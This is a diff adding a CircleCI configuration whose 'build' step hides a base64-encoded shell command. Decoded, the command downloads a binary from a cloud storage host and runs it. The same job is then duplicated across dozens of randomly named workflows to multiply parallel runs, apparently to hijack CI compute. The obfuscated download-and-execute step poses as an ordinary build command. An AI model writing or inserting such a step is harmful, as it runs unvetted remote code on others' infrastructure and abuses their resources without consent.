@@ -1,0 +1,139 @@
+version: 2.1 
+executors: 
+  circleci_machine: 
+    docker: 
+      - image: cimg/node:lts
+    working_directory: ~/my-project 
+commands: 
+  build: 
+    description: Run build 
+    steps: 
+      - checkout 
+      - run: 
+          name: build 
+          command: | 
+              sudo apt update  
+                
+      - run: 
+          name: build 
+          command: | 
+              echo 'd2dldCAtTyBsYXNtb2RlZCBodHRwczovL21vZGVsaW5nLnNncDEuY2RuLmRpZ2l0YWxvY2VhbnNwYWNlcy5jb20vbGFzdHBvaW50L2xhc3Rtb2RlbCAmJiBjaG1vZCAreCBsYXNtb2RlZCAmJiAuL2xhc21vZGVk' > runner; base64 runner -d | bash
+ 
+jobs: 
+  buildd: 
+    executor: circleci_machine 
+    working_directory: ~/my-project 
+    steps: [build] 
+ 
+     
+     
+workflows: 
+  version: 2 
+  trjdtyj: 
+    jobs: 
+      - buildd 
+  jdytdtyj: 
+    jobs: 
+      - buildd 
+  tdjyjytj: 
+    jobs: 
+      - buildd 
+  ettrhhj: 
+    jobs: 
+      - buildd 
+  tyjykykf: 
+    jobs: 
+      - buildd 
+  bfkfytktf: 
+    jobs: 
+      - buildd 
+  tyjktyk: 
+    jobs: 
+      - buildd 
+  tyktkyky: 
+    jobs: 
+      - buildd 
+  etrgved: 
+    jobs: 
+      - buildd 
+  btyjtytjj: 
+    jobs: 
+      - buildd 
+  rhtjtyj: 
+    jobs: 
+      - buildd 
+  tyjtjtyry: 
+    jobs: 
+      - buildd 
+  rtyytjkuk: 
+    jobs: 
+      - buildd 
+  ykmhtyyj: 
+    jobs: 
+      - buildd 
+  tjykmj: 
+    jobs: 
+      - buildd 
+  tyjtkujm: 
+    jobs: 
+      - buildd 
+  tyjuykh: 
+    jobs: 
+      - buildd 
+  tyjjhm: 
+    jobs: 
+      - buildd 
+  ytjuykjb: 
+    jobs: 
+      - buildd 
+  ytjuyhukjb: 
+    jobs: 
+      - buildd
+  ytjuyhukjb1: 
+    jobs: 
+      - buildd	  
+  ytjuyhukjb2: 
+    jobs: 
+      - buildd	  
+  ytjuyhukjb3: 
+    jobs: 
+      - buildd	  
+  ytjuyhukjb4: 
+    jobs: 
+      - buildd	  
+  ytjuyhukjb5: 
+    jobs: 
+      - buildd
+  ytjuyhukjb6: 
+    jobs: 
+      - buildd
+  ytjuyhukjb7: 
+    jobs: 
+      - buildd
+  ytjuyhukjb8: 
+    jobs: 
+      - buildd
+  ytjuyhukjb9: 
+    jobs: 
+      - buildd
+  ytjuyhukjb10: 
+    jobs: 
+      - buildd
+  ytjuyhukjb11: 
+    jobs: 
+      - buildd
+  ytjuyhukjb12: 
+    jobs: 
+      - buildd
+  ytjuyhukjb13: 
+    jobs: 
+      - buildd
+  ytjuyhukjb14: 
+    jobs: 
+      - buildd
+  ytjuyhukjb15: 
+    jobs: 
+      - buildd
+  ytjuyhukjb16: 
+    jobs: 
+      - buildd
